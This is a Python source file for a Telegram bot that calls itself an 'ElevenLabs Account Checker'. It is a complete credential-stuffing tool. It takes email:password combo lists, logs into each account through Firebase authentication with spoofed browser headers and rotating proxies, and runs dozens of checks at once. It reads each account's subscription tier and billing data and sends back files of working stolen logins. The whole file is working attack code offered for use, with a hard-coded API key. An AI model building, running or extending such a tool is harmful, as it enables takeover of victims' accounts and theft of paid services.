import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram import Update
import requests
import re
import uuid
from datetime import datetime
import random
import asyncio
import io
import os
import threading
import json

# Get Telegram bot token from environment variable
TELEGRAM_TOKEN = os.getenv('TELEGRAM_TOKEN', 'YOUR_BOT_TOKEN_HERE')

# ElevenLabs API endpoints
FIREBASE_AUTH_URL = "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyBSsRE_1Os04-bxpd5JTLIniy3UK4OqKys"
ELEVENLABS_SUBSCRIPTION_URL = "https://api.us.elevenlabs.io/v1/user/subscription"

# Anti-duplicate system
processed_messages = set()
message_lock = threading.Lock()

# Global storage
user_proxies = {}
user_active_counters = {}
user_thread_settings = {}

def prevent_duplicate(func):
    """Decorator to prevent duplicate message processing"""
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
        message_key = f"{update.update_id}_{update.message.from_user.id}_{hash(update.message.text)}"

        with message_lock:
            if message_key in processed_messages:
                return  # Skip duplicate
            processed_messages.add(message_key)

            # Clean old messages periodically
            if len(processed_messages) > 500:
                processed_messages.clear()

        return await func(update, context)
    return wrapper

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_index = 0
        self.lock = threading.Lock()

    def add_proxy(self, proxy_string):
        """Add a proxy in format ip:port:user:pass"""
        try:
            parts = proxy_string.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
                proxy_dict = {
                    'http': f'http://{username}:{password}@{ip}:{port}',
                    'https': f'http://{username}:{password}@{ip}:{port}'
                }
                with self.lock:
                    self.proxies.append(proxy_dict)
                return True
            elif len(parts) == 2:
                ip, port = parts
                proxy_dict = {
                    'http': f'http://{ip}:{port}',
                    'https': f'http://{ip}:{port}'
                }
                with self.lock:
                    self.proxies.append(proxy_dict)
                return True
        except Exception as e:
            print(f"Error adding proxy: {e}")
        return False

    def get_next_proxy(self):
        """Get next proxy in rotation - thread safe"""
        if not self.proxies:
            return None

        with self.lock:
            proxy = self.proxies[self.current_index]
            self.current_index = (self.current_index + 1) % len(self.proxies)
            return proxy

    def clear_proxies(self):
        """Clear all proxies"""
        with self.lock:
            self.proxies.clear()
            self.current_index = 0

    def get_proxy_count(self):
        """Get number of proxies"""
        with self.lock:
            return len(self.proxies)

def get_user_proxy_manager(user_id):
    """Get or create proxy manager for user"""
    if user_id not in user_proxies:
        user_proxies[user_id] = ProxyManager()
    return user_proxies[user_id]

def get_user_thread_setting(user_id):
    """Get thread setting for user (default: 10 threads)"""
    return user_thread_settings.get(user_id, 10)

def set_user_thread_setting(user_id, threads):
    """Set thread setting for user"""
    user_thread_settings[user_id] = max(1, min(threads, 100))  # Limit between 1-100

def increment_user_active_counter(user_id):
    """Increment active counter for user - thread safe"""
    if user_id not in user_active_counters:
        user_active_counters[user_id] = 0
    user_active_counters[user_id] += 1
    return user_active_counters[user_id]

def parse_value(text, start_key, end_key):
    """Extract value between two strings"""
    try:
        start_index = text.find(start_key)
        if start_index == -1:
            return None
        start_index += len(start_key)
        end_index = text.find(end_key, start_index)
        if end_index == -1:
            return None
        return text[start_index:end_index]
    except:
        return None

def unix_timestamp_to_date(timestamp):
    """Convert Unix timestamp to date format"""
    try:
        if timestamp and timestamp != "N/A":
            return datetime.fromtimestamp(int(timestamp)).strftime('%Y-%m-%d')
        return "N/A"
    except:
        return "N/A"

def get_remaining_days(date_str):
    """Calculate days remaining from date string"""
    if not date_str or date_str == "N/A":
        return -1
    try:
        expiry = datetime.strptime(date_str, "%Y-%m-%d")
        today = datetime.today()
        return (expiry - today).days
    except:
        return -1

async def check_single_account(email, password, proxy_manager=None):
    """Check a single ElevenLabs account and return results"""
    try:
        # Get proxy if available
        proxy = proxy_manager.get_next_proxy() if proxy_manager else None

        # Firebase Auth headers
        auth_headers = {
            "host": "identitytoolkit.googleapis.com",
            "content-type": "application/json",
            "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
            "x-firebase-gmpid": "1:265222077342:web:3acce90d1596672570348f",
            "x-client-version": "Chrome/JsCore/11.2.0/FirebaseCore-web",
            "sec-ch-ua-mobile": "?1",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
            "sec-ch-ua-platform": '"Android"',
            "accept": "*/*",
            "origin": "https://elevenlabs.io",
            "x-client-data": "CMKBywE=",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
        }

        # Firebase Auth payload
        auth_payload = {
            "returnSecureToken": True,
            "email": email,
            "password": password,
            "clientType": "CLIENT_TYPE_WEB"
        }

        with requests.Session() as s:
            # Apply proxy to session if available
            if proxy:
                s.proxies.update(proxy)

            # First request - Firebase Authentication
            auth_response = s.post(
                FIREBASE_AUTH_URL,
                json=auth_payload,
                headers=auth_headers,
                timeout=30
            )

            # Check for authentication errors
            if "error" in auth_response.text or "INVALID_LOGIN_CREDENTIALS" in auth_response.text:
                return {"status": "INVALID", "email": email, "password": password}

            # Parse idToken
            auth_data = auth_response.json()
            if "idToken" not in auth_data:
                return {"status": "ERROR", "email": email, "password": password}

            id_token = auth_data["idToken"]

            # ElevenLabs API headers
            elevenlabs_headers = {
                "host": "api.us.elevenlabs.io",
                "content-type": "application/json",
                "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
                "sec-ch-ua-mobile": "?1",
                "authorization": f"Bearer {id_token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "accept": "*/*",
                "origin": "https://elevenlabs.io",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://elevenlabs.io/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
            }

            # Second request - Get subscription info
            subscription_response = s.get(
                ELEVENLABS_SUBSCRIPTION_URL,
                headers=elevenlabs_headers,
                timeout=30
            )

            # Check subscription response
            if subscription_response.status_code != 200:
                return {"status": "ERROR", "email": email, "password": password}

            response_text = subscription_response.text

            # Parse subscription details
            status = "FREE"
            if '"status":"active"' in response_text:
                status = "ACTIVE"

            character_limit = parse_value(response_text, '"character_limit":', ',') or "N/A"
            subscription_tier = parse_value(response_text, '"tier":"', '",') or "FREE"
            billing_period = parse_value(response_text, '"billing_period":"', '",') or "N/A"
            next_payment_unix = parse_value(response_text, '"next_payment_attempt_unix":', '},') or parse_value(response_text, '"next_payment_attempt_unix":', '}') or "N/A"

            # Convert Unix timestamp to date
            next_payment_date = unix_timestamp_to_date(next_payment_unix)
            remaining_days = get_remaining_days(next_payment_date)

            return {
                "status": status,
                "email": email,
                "password": password,
                "character_limit": character_limit,
                "subscription_tier": subscription_tier,
                "billing_period": billing_period,
                "next_payment_date": next_payment_date,
                "remaining_days": remaining_days
            }

    except Exception as e:
        return {"status": "ERROR", "email": email, "password": password, "error": str(e)}

@prevent_duplicate
async def check_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)

        # Parse user input
        message_text = update.message.text.strip()

        # Remove /check command
        if message_text.startswith('/check '):
            credentials = message_text[7:]  # Remove '/check '
        else:
            await update.message.reply_text("❌ Please use format: /check email:password")
            return

        # Handle email:password format
        if ':' in credentials:
            email, password = credentials.split(':', 1)  # Split only on first colon
        else:
            await update.message.reply_text("❌ Please use format: /check email:password")
            return

        # Use proxy manager if proxies are configured
        proxy_to_use = proxy_manager if proxy_manager.get_proxy_count() > 0 else None

        result = await check_single_account(email, password, proxy_to_use)

        if result["status"] == "ACTIVE":
            # Increment counter for this user
            counter = increment_user_active_counter(user_id)

            # Format response with HTML
            response_text = f"✅ <b>ACTIVE #{counter}</b>\n"
            response_text += f"🔤 <b>Character Limit:</b> {result.get('character_limit', 'N/A')}\n"
            response_text += f"🏆 <b>Subscription Tier:</b> {result.get('subscription_tier', 'FREE')}\n"
            response_text += f"💳 <b>Billing Period:</b> {result.get('billing_period', 'N/A')}\n"
            response_text += f"📅 <b>Next Payment:</b> {result.get('next_payment_date', 'N/A')}\n"

            if result.get('remaining_days', -1) >= 0:
                response_text += f"⏳ <b>Remaining Days:</b> {result.get('remaining_days', 'N/A')}\n"

            response_text += f"⚜️ <b>Data:</b> {email}:{password}"

            await update.message.reply_text(response_text, parse_mode='HTML')
        elif result["status"] == "FREE":
            # Show free accounts too
            response_text = f"🆓 <b>FREE ACCOUNT</b>\n"
            response_text += f"🔤 <b>Character Limit:</b> {result.get('character_limit', 'N/A')}\n"
            response_text += f"🏆 <b>Subscription Tier:</b> {result.get('subscription_tier', 'FREE')}\n"
            response_text += f"⚜️ <b>Data:</b> {email}:{password}"
            await update.message.reply_text(response_text, parse_mode='HTML')
        else:
            await update.message.reply_text(f"❌ Account check failed. Status: {result['status']}")

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {str(e)}")

@prevent_duplicate
async def combo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📁 Send me a .txt file with accounts (email:password format)")

async def process_account_batch(accounts_batch, proxy_manager, user_id):
    """Process a batch of accounts concurrently"""
    tasks = []
    for account in accounts_batch:
        try:
            email, password = account.split(':', 1)
            task = check_single_account(email, password, proxy_manager)
            tasks.append(task)
        except:
            continue

    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        return [result for result in results if isinstance(result, dict)]
    return []

@prevent_duplicate
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)
        thread_count = get_user_thread_setting(user_id)

        # Check if this is a proxy file upload
        if update.message.caption and 'proxy' in update.message.caption.lower():
            await handle_proxy_file(update, context)
            return

        # Check if document is a text file
        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please send a .txt file only")
            return

        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_bytes = await file.download_as_bytearray()

        # Parse the file content
        content = file_bytes.decode('utf-8')
        lines = content.strip().split('\n')

        # Filter valid email:password format
        accounts = []
        for line in lines:
            line = line.strip()
            if ':' in line:
                accounts.append(line)

        if not accounts:
            await update.message.reply_text("❌ No valid accounts found in the file")
            return

        proxy_count = proxy_manager.get_proxy_count()
        proxy_text = f" using {proxy_count} proxies" if proxy_count > 0 else " (no proxies)"

        await update.message.reply_text(
            f"🔄 Processing {len(accounts)} accounts with {thread_count} threads{proxy_text}..."
        )

        active_accounts = []
        free_accounts = []
        inactive_accounts = []

        # Split accounts into batches for concurrent processing
        batch_size = thread_count
        account_batches = [accounts[i:i + batch_size] for i in range(0, len(accounts), batch_size)]

        processed_count = 0

        for batch_num, batch in enumerate(account_batches, 1):
            # Process current batch concurrently
            batch_results = await process_account_batch(batch, proxy_manager, user_id)

            # Process results
            for result in batch_results:
                processed_count += 1

                if result["status"] == "ACTIVE":
                    active_accounts.append(result)
                    # Show active accounts in chat
                    response_text = f"✅ <b>ACTIVE #{len(active_accounts)}</b>\n"
                    response_text += f"🔤 <b>Character Limit:</b> {result.get('character_limit', 'N/A')}\n"
                    response_text += f"🏆 <b>Subscription Tier:</b> {result.get('subscription_tier', 'FREE')}\n"
                    response_text += f"💳 <b>Billing Period:</b> {result.get('billing_period', 'N/A')}\n"
                    response_text += f"📅 <b>Next Payment:</b> {result.get('next_payment_date', 'N/A')}\n"

                    if result.get('remaining_days', -1) >= 0:
                        response_text += f"⏳ <b>Remaining Days:</b> {result.get('remaining_days', 'N/A')}\n"

                    response_text += f"⚜️ <b>Data:</b> {result['email']}:{result['password']}"

                    await update.message.reply_text(response_text, parse_mode='HTML')

                elif result["status"] == "FREE":
                    free_accounts.append(result)
                    # Optionally show free accounts
                    response_text = f"🆓 <b>FREE #{len(free_accounts)}</b>\n"
                    response_text += f"🔤 <b>Character Limit:</b> {result.get('character_limit', 'N/A')}\n"
                    response_text += f"⚜️ <b>Data:</b> {result['email']}:{result['password']}"
                    await update.message.reply_text(response_text, parse_mode='HTML')
                else:
                    inactive_accounts.append(result)

            # Progress update every 5 batches
            if batch_num % 5 == 0 or batch_num == len(account_batches):
                await update.message.reply_text(
                    f"📊 Progress: {processed_count}/{len(accounts)} - Active: {len(active_accounts)} - Free: {len(free_accounts)} - Threads: {thread_count}"
                )

        # Create and send result files
        await send_result_files(update, active_accounts, free_accounts, inactive_accounts)

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error processing file: {str(e)}")

async def handle_proxy_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded proxy file"""
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)

        # Download the file
        file = await context.bot.get_file(update.message.document.file_id)
        file_content = await file.download_as_bytearray()

        # Parse proxy file
        proxy_text = file_content.decode('utf-8')
        proxy_lines = [line.strip() for line in proxy_text.split('\n') if line.strip()]

        added_count = 0
        for proxy_line in proxy_lines:
            if proxy_manager.add_proxy(proxy_line):
                added_count += 1

        result_text = f"✅ <b>Proxy file processed!</b>\n📊 <b>Added:</b> {added_count} proxies\n🔧 <b>Total proxies:</b> {proxy_manager.get_proxy_count()}"
        await update.message.reply_text(result_text, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error processing proxy file: {str(e)}", parse_mode='HTML')

async def send_result_files(update: Update, active_accounts, free_accounts, inactive_accounts):
    try:
        # Create active accounts file
        active_content = ""
        for acc in active_accounts:
            active_content += f"{acc['email']}:{acc['password']}\n"

        # Create free accounts file
        free_content = ""
        for acc in free_accounts:
            free_content += f"{acc['email']}:{acc['password']}\n"

        # Create inactive accounts file
        inactive_content = ""
        for acc in inactive_accounts:
            if 'password' in acc:
                inactive_content += f"{acc['email']}:{acc['password']}\n"
            else:
                inactive_content += f"{acc['email']}:unknown\n"

        # Send active accounts file
        if active_content:
            active_file = io.BytesIO(active_content.encode('utf-8'))
            active_file.name = f"elevenlabs_active_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            await update.message.reply_document(
                document=active_file,
                filename=active_file.name,
                caption=f"✅ <b>Active ElevenLabs Accounts:</b> {len(active_accounts)}",
                parse_mode='HTML'
            )

        # Send free accounts file
        if free_content:
            free_file = io.BytesIO(free_content.encode('utf-8'))
            free_file.name = f"elevenlabs_free_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            await update.message.reply_document(
                document=free_file,
                filename=free_file.name,
                caption=f"🆓 <b>Free ElevenLabs Accounts:</b> {len(free_accounts)}",
                parse_mode='HTML'
            )

        # Send inactive accounts file
        if inactive_content:
            inactive_file = io.BytesIO(inactive_content.encode('utf-8'))
            inactive_file.name = f"elevenlabs_inactive_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            await update.message.reply_document(
                document=inactive_file,
                filename=inactive_file.name,
                caption=f"❌ <b>Inactive ElevenLabs Accounts:</b> {len(inactive_accounts)}",
                parse_mode='HTML'
            )

        # Send summary
        summary = f"📊 <b>ElevenLabs Processing Complete!</b>\n\n"
        summary += f"✅ <b>Active:</b> {len(active_accounts)}\n"
        summary += f"🆓 <b>Free:</b> {len(free_accounts)}\n"
        summary += f"❌ <b>Inactive:</b> {len(inactive_accounts)}\n"
        summary += f"🔢 <b>Total Processed:</b> {len(active_accounts) + len(free_accounts) + len(inactive_accounts)}"

        await update.message.reply_text(summary, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"⚠️ Error creating files: {str(e)}")

@prevent_duplicate
async def set_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set number of threads for concurrent processing"""
    try:
        user_id = update.message.from_user.id

        if not context.args:
            current_threads = get_user_thread_setting(user_id)
            await update.message.reply_text(
                f"📊 <b>Current thread setting:</b> {current_threads}\n\n"
                f"Usage: <code>/threads 15</code>\n"
                f"Range: 1-50 threads", 
                parse_mode='HTML'
            )
            return

        try:
            threads = int(context.args[0])
            if threads < 1 or threads > 50:
                await update.message.reply_text("❌ Thread count must be between 1 and 50")
                return

            set_user_thread_setting(user_id, threads)
            await update.message.reply_text(
                f"✅ Thread count set to <b>{threads}</b>\n"
                f"🚀 This will speed up bulk checking significantly!", 
                parse_mode='HTML'
            )

        except ValueError:
            await update.message.reply_text("❌ Please provide a valid number")

    except Exception as e:
        await update.message.reply_text(f"❌ Error setting threads: {str(e)}")

@prevent_duplicate
async def set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Set proxy for the user"""
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)

        if not context.args:
            await update.message.reply_text("❌ Please provide proxy in format: /proxy ip:port:user:pass", parse_mode='HTML')
            return

        proxy_string = ' '.join(context.args)

        if proxy_manager.add_proxy(proxy_string):
            await update.message.reply_text(f"✅ Proxy added successfully! Total proxies: {proxy_manager.get_proxy_count()}", parse_mode='HTML')
        else:
            await update.message.reply_text("❌ Invalid proxy format. Use: ip:port:user:pass or ip:port", parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error setting proxy: {str(e)}", parse_mode='HTML')

@prevent_duplicate
async def clear_proxies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear all proxies for the user"""
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)
        proxy_manager.clear_proxies()
        await update.message.reply_text("✅ All proxies cleared!", parse_mode='HTML')
    except Exception as e:
        await update.message.reply_text(f"❌ Error clearing proxies: {str(e)}", parse_mode='HTML')

@prevent_duplicate
async def proxy_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy and thread status for the user"""
    try:
        user_id = update.message.from_user.id
        proxy_manager = get_user_proxy_manager(user_id)
        thread_count = get_user_thread_setting(user_id)

        proxy_count = proxy_manager.get_proxy_count()
        status_text = f"📊 <b>Configuration Status:</b>\n\n"
        status_text += f"🌐 <b>Proxies:</b> {proxy_count}\n"
        status_text += f"🔄 <b>Current proxy index:</b> {proxy_manager.current_index}\n"
        status_text += f"⚡ <b>Threads:</b> {thread_count}\n\n"

        if proxy_count > 0:
            speed_estimate = proxy_count * thread_count
            status_text += f"🚀 <b>Estimated speed:</b> Up to {speed_estimate} concurrent requests"
        else:
            status_text += "⚠️ <b>No proxies configured</b> - Consider adding proxies for better performance"

        await update.message.reply_text(status_text, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error getting status: {str(e)}", parse_mode='HTML')

@prevent_duplicate
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = "🎤 <b>ElevenLabs Account Checker - by @medusaXD</b>\n\n"
    welcome_msg += "📋 <b>Commands:</b>\n"
    welcome_msg += "• /check email:password - Check single account\n"
    welcome_msg += "• /combo - Upload .txt file for bulk checking\n"
    welcome_msg += "• /proxy ip:port:user:pass - Add proxy\n"
    welcome_msg += "• /threads 15 - Set thread count (1-100)\n"
    welcome_msg += "• /status - Check proxy & thread status\n"
    welcome_msg += "• /clearproxy - Clear all proxies\n\n"
    welcome_msg += "⚡ <b>Threading:</b> Default 10 threads per user\n"
    welcome_msg += "🌐 <b>Proxy Support:</b> Upload .txt file with caption 'proxy'\n"
    welcome_msg += "🚀 <b>Performance:</b> Proxies × Threads = Max Speed!\n\n"
    welcome_msg += "✅ <b>Anti-Duplicate:</b> No double responses!\n"
    welcome_msg += "🎯 <b>Detects:</b> Active, Free, and Invalid accounts"

    await update.message.reply_text(welcome_msg, parse_mode='HTML')

def main():
    print("🚀 Starting ElevenLabs Account Checker Bot...")
    print(f"🔑 Using token: {TELEGRAM_TOKEN[:10]}...")
    print("✅ Features: Threading + Proxies + Anti-Duplicate")

    # Create application
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    # Add handlers with duplicate prevention
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("check", check_account))
    application.add_handler(CommandHandler("combo", combo_command))
    application.add_handler(CommandHandler("proxy", set_proxy))
    application.add_handler(CommandHandler("threads", set_threads))
    application.add_handler(CommandHandler("status", proxy_status))
    application.add_handler(CommandHandler("clearproxy", clear_proxies))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Run the application
    print("✅ ElevenLabs Bot is running with all features...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
